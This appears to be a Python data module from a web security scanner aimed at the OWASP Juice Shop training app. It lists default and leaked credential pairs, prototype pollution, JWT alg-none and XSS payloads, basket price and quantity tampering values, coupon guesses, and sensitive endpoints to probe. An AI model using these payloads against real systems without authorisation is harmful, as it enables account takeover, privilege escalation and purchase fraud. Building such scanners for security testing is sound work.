# ── Broken Authentication / Weak Credentials ───────────────────────────────────
WEAK_CREDENTIAL_PAIRS = [
    # Admin credentials — Juice Shop default + common defaults
    ("admin@juice-sh.op", "admin123"),
    ("admin@juice-sh.op", "admin"),
    ("admin@juice-sh.op", "password"),
    ("admin@juice-sh.op", "12345"),
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("admin", "123456"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("root", "toor"),
    ("test@test.com", "test"),
    ("test@test.com", "test123"),
    ("user@example.com", "password"),
    ("demo@demo.com", "demo"),
    # Common REST API test accounts
    ("customer1@juice-sh.op", "customer1"),
    ("bender@juice-sh.op", "OhG0dPlease1sThisStheRealBender!"),
    ("jim@juice-sh.op", "ncc-1701"),
]

# ── Prototype Pollution ────────────────────────────────────────────────────────
PROTOTYPE_POLLUTION_PAYLOADS = [
    # JSON body prototype pollution
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"admin": True}},
    # URL query prototype pollution
    "__proto__[isAdmin]=true",
    "constructor[prototype][isAdmin]=true",
    "__proto__[role]=admin",
]

# ── Insecure Deserialization ───────────────────────────────────────────────────
DESERIALIZATION_PATHS = [
    "/api/import", "/import", "/api/deserialize",
    "/api/restore", "/restore", "/api/backup/restore",
]

# Mass Assignment / Admin Registration — MASS_ASSIGNMENT_ROLE_FIELDS lives at
# the top of this file now (merged with what used to be a duplicate,
# silently-shadowing definition here — see that definition's comment).

# ── Business Logic Attacks ─────────────────────────────────────────────────────
# Juice Shop specific + general business logic
BUSINESS_LOGIC_BASKET_ATTACKS = [
    # Negative quantity to make order total negative (get money)
    {"quantity": -100},
    {"quantity": -1},
    # Zero price manipulation
    {"price": 0},
    {"price": -0.01},
    # Integer overflow
    {"quantity": 2147483647},
]

COUPON_CODES = [
    # Known Juice Shop expired + active coupons
    "WMNSDY2019", "WMNSDY2020", "WMNSDY2021",
    "ORANGE2021", "ORANGE2022",
    "DISCOUNT10", "PROMO15",
    "test", "admin", "coupon", "free",
    "BOGO", "SAVE50", "FREE100",
]

# ── JWT Attack Payloads ────────────────────────────────────────────────────────
JWT_ALG_NONE_VARIANTS = [
    "none", "None", "NONE", "nOnE",
    "none ", "none\t", "none\n",  # whitespace variants
]

# ── Sensitive API Endpoints (Authenticated) ────────────────────────────────────
# These endpoints should require auth but often don't
SENSITIVE_AUTH_ENDPOINTS = [
    # Juice Shop specific
    ("/rest/user/whoami", "GET"),
    ("/rest/basket/1", "GET"),
    ("/rest/basket/2", "GET"),
    ("/api/Users", "GET"),
    ("/api/Users/1", "GET"),
    ("/api/Users/2", "GET"),
    ("/api/Feedbacks", "GET"),
    ("/api/Orders", "GET"),
    # Generic sensitive endpoints
    ("/api/admin/users", "GET"),
    ("/api/v1/users", "GET"),
    ("/api/profile", "GET"),
    ("/api/me", "GET"),
]

# ── DOM XSS Payloads ───────────────────────────────────────────────────────────
DOM_XSS_PAYLOADS = [
    '<iframe src="javascript:alert(`xss`)">',
    '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/770733527&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>',
    '<script>alert(`xss`)</script>',
    'javascript:alert(`xss`)',
]

DOM_XSS_SINK_PARAMS = [
    # URL params commonly used as DOM sinks
    "q", "search", "#", "to", "redirect", "lang", "currency",
]
